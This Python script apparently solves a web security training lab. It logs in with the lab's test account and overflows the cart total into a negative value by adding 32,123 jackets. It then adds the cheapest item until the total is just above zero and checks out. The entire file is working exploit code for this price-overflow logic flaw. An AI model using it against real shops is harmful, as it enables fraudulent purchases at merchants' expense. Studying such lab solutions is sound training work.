#!/usr/bin/env python3
import requests
import sys
import urllib3
import math
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def login(s, url):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def get_cheapest_product(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    products = []
    for div in soup.find_all("div"):
        link = div.find("a", href=re.compile(r"productId="))
        price_match = re.search(r"\$([0-9]+\.[0-9]{2})", div.text)
        if link and price_match:
            product_id = link["href"].split("=")[1]
            price = float(price_match.group(1))
            if product_id != "1":
                products.append({"product_id": product_id, "price": price})
    return min(products, key=lambda x: x["price"])

def add_to_cart(s, url, product_id, quantity):
    print(f"[*] Adding product {product_id} to cart: 0 / {quantity}", end="\r")
    cart_url = url + "/cart"
    added = 0
    while quantity - added >= 99:
        data = {"productId": product_id, "quantity": 99, "redir": "CART"}
        s.post(cart_url, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
        added += 99
        print(f"[*] Adding product {product_id} to cart: {added} / {quantity}", end="\r")
    remainder = quantity - added
    if remainder > 0:
        data = {"productId": product_id, "quantity": remainder, "redir": "CART"}
        s.post(cart_url, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    print(f"[+] Added product {product_id} to cart: {quantity} / {quantity}")

def get_cart_total(s, url):
    r = s.get(url + "/cart", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    for row in soup.find_all("tr"):
        if "Total:" in row.text:
            match = re.search(r"\$(-?[0-9]+\.[0-9]{2})", row.text)
            if match:
                return float(match.group(1))
    return None

def checkout(s, url):
    print("[*] Attempting checkout...")
    csrf = get_csrf_token(s, url + "/cart")
    data = {"csrf": csrf}
    r = s.post(url + "/cart/checkout", data=data, verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Checkout successful - Lab solved!")
        return True
    print("[-] Checkout failed")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url):
        print("[-] Login failed")
        return
    print("[+] Login successful")

    cheap = get_cheapest_product(s, url)
    print(f"[+] Cheapest product: id={cheap['product_id']} @ ${cheap['price']:.2f}")

    # Add enough jackets to overflow price into negative
    add_to_cart(s, url, "1", 32123)
    total = get_cart_total(s, url)
    print(f"[+] Cart total after jackets: ${total:.2f}")

    # Add cheapest item to nudge total back above $0
    required = math.ceil(abs(total) / cheap["price"])
    print(f"[+] Adding {required} x product {cheap['product_id']} to bring total above $0")
    add_to_cart(s, url, cheap["product_id"], required)
    total = get_cart_total(s, url)
    print(f"[+] Final cart total: ${total:.2f}")

    checkout(s, url)

if __name__ == "__main__":
    main()